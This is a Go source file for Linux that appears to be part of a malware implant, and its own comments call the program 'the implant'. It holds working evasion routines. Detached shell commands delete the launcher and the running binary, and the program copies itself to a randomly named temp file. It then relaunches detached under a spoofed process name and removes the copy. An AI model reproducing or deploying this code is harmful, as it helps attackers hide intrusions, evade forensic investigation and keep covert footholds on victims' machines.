//go:build linux

package main

import (
	"crypto/rand"  
	"encoding/hex" 
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
)

func init() {
	doSelfDelete = linuxScheduleSelfDeleteGrandchild
	relaunchAsDaemonInternal = linuxRelaunchAsDaemon

}

func linuxScheduleSelfDeleteGrandchild(selfExePath string, originalLauncherPath string) {

	if originalLauncherPath != "" && originalLauncherPath != selfExePath {
		quotedOriginalPath := fmt.Sprintf("%q", originalLauncherPath)
		deleterCmdScript := fmt.Sprintf("sleep 1 && rm -f %s", quotedOriginalPath)

		cmd := exec.Command("sh", "-c", deleterCmdScript)
		cmd.SysProcAttr = &syscall.SysProcAttr{
			Setsid: true, // Detach from the current session, run independently.
		}
		err := cmd.Start()
		if err == nil {
			go func() {
				_ = cmd.Wait() // Reap the child process
			}()
		}
	}

	quotedSelfPath := fmt.Sprintf("%q", selfExePath)
	deleterCmdScriptSelf := fmt.Sprintf("sleep 3 && rm -f %s", quotedSelfPath)

	cmdSelf := exec.Command("sh", "-c", deleterCmdScriptSelf)
	cmdSelf.SysProcAttr = &syscall.SysProcAttr{
		Setsid: true, // Detach from the current session, run independently.
	}

	err := cmdSelf.Start() // Note: This `err` shadows the one from the previous block, which is fine.
	if err == nil {
		// Instead of Releasing, Wait for the process in a new goroutine
		// to prevent it from becoming a zombie if the parent (implant) is still running.
		go func() {
			_ = cmdSelf.Wait() // Reap the child process
		}()
	}

}

//

func linuxRelaunchAsDaemon(originalLauncherExecutablePath string, argsForNewProcess []string, targetArgv0Name string, bgEnvMarkerKey string, origPathEnvKey string, origPathEnvValue string) error {

	randBytes := make([]byte, 8)
	_, err := rand.Read(randBytes)
	if err != nil {
		return fmt.Errorf("failed to generate random bytes for temp file: %v", err)
	}
	tempFileName := filepath.Join(os.TempDir(), "implant_"+hex.EncodeToString(randBytes))

	inputBytes, err := os.ReadFile(originalLauncherExecutablePath)
	if err != nil {
		return fmt.Errorf("failed to read original executable '%s': %v", originalLauncherExecutablePath, err)
	}

	err = os.WriteFile(tempFileName, inputBytes, 0700) // rwx------
	if err != nil {
		return fmt.Errorf("failed to write temporary executable '%s': %v", tempFileName, err)
	}

	cmd := exec.Command(tempFileName)
	cmd.Args = append([]string{targetArgv0Name}, argsForNewProcess...)

	cmd.Env = os.Environ()
	cmd.Env = append(cmd.Env, fmt.Sprintf("%s=1", bgEnvMarkerKey))
	cmd.Env = append(cmd.Env, fmt.Sprintf("%s=%s", origPathEnvKey, origPathEnvValue))

	cmd.SysProcAttr = &syscall.SysProcAttr{
		Setsid: true,
	}

	err = cmd.Start()
	if err != nil {
		// If starting fails, try to clean up the temporary file
		_ = os.Remove(tempFileName)
		return fmt.Errorf("failed to start detached process from '%s' as '%s': %v", tempFileName, targetArgv0Name, err)
	}

	errRemove := os.Remove(tempFileName)
	if errRemove != nil {
	}

	return nil
}
